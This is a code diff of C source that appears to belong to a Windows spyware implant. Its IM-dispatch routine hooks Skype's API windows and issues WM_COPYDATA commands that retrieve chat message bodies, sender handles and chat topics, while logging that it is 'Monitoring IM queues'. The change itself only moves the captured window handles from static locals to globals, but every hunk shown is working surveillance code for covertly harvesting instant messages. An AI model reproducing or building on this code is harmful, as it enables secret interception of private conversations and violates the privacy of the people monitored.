@@ -204,8 +204,6 @@ void SkypeLogMessageEntry(im_skype_message_entry *skentry)
 
 DWORD __stdcall PM_IMDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *time_nanosec)
 {
-	static HWND im_skype_api_wnd = NULL;
-	static HWND im_skype_pm_wnd = NULL;
 	DWORD i, dummy;
 	COPYDATASTRUCT cd_struct;
 	char req_buf[512];
@@ -221,16 +219,16 @@ DWORD __stdcall PM_IMDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *t
 	}
 	if (dwFlags == FLAGS_SKAPI_WND) {
 		REPORT_STATUS_LOG("- Monitoring IM queues.............OK\r\n");
-		im_skype_api_wnd = *((HWND *)msg);
+		skype_api_wnd = *((HWND *)msg);
 		return 1;
 	}
 	if (dwFlags == FLAGS_SKAPI_SWD) {
-		im_skype_pm_wnd = *((HWND *)msg);
+		skype_pm_wnd = *((HWND *)msg);
 		return 1;
 	}
 
 	// Per proseguire devo aver gia' intercettato le finestre
-	if (!im_skype_api_wnd || !im_skype_pm_wnd)
+	if (!skype_api_wnd || !skype_pm_wnd)
 		return 0;
 	if (dwFlags == FLAGS_SKAPI_MSG) {
 		NullTerminatePacket(dwLen, msg);
@@ -283,19 +281,19 @@ DWORD __stdcall PM_IMDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *t
 			cd_struct.dwData = 0;
 			cd_struct.lpData = req_buf;
 			cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
-			HM_SafeSendMessageTimeoutW(im_skype_api_wnd, WM_COPYDATA, (WPARAM)im_skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
+			HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
 			
 			_snprintf_s(req_buf, sizeof(req_buf), _TRUNCATE, "#IMAGB%s GET CHATMESSAGE %s BODY", message_id, message_id);		
 			cd_struct.dwData = 0;
 			cd_struct.lpData = req_buf;
 			cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
-			HM_SafeSendMessageTimeoutW(im_skype_api_wnd, WM_COPYDATA, (WPARAM)im_skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
+			HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
 
 			_snprintf_s(req_buf, sizeof(req_buf), _TRUNCATE, "#IMAGA%s GET CHATMESSAGE %s FROM_HANDLE", message_id, message_id);		
 			cd_struct.dwData = 0;
 			cd_struct.lpData = req_buf;
 			cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
-			HM_SafeSendMessageTimeoutW(im_skype_api_wnd, WM_COPYDATA, (WPARAM)im_skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
+			HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
 
 			return 1;
 		} else if (!strncmp((char *)msg, "#IMAGB", strlen("#IMAGB")) || 
@@ -352,13 +350,13 @@ DWORD __stdcall PM_IMDispatch(BYTE *msg, DWORD dwLen, DWORD dwFlags, FILETIME *t
 				cd_struct.dwData = 0;
 				cd_struct.lpData = req_buf;
 				cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
-				HM_SafeSendMessageTimeoutW(im_skype_api_wnd, WM_COPYDATA, (WPARAM)im_skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
+				HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
 				
 				_snprintf_s(req_buf, sizeof(req_buf), _TRUNCATE, "#IMAGT%s GET CHAT %s TOPIC", message_id, chat_name);		
 				cd_struct.dwData = 0;
 				cd_struct.lpData = req_buf;
 				cd_struct.cbData = strlen((char *)cd_struct.lpData)+1;
-				HM_SafeSendMessageTimeoutW(im_skype_api_wnd, WM_COPYDATA, (WPARAM)im_skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
+				HM_SafeSendMessageTimeoutW(skype_api_wnd, WM_COPYDATA, (WPARAM)skype_pm_wnd, (LPARAM)&cd_struct, SMTO_NORMAL, 0, &dummy);
 			}
 			return 1;
 		}
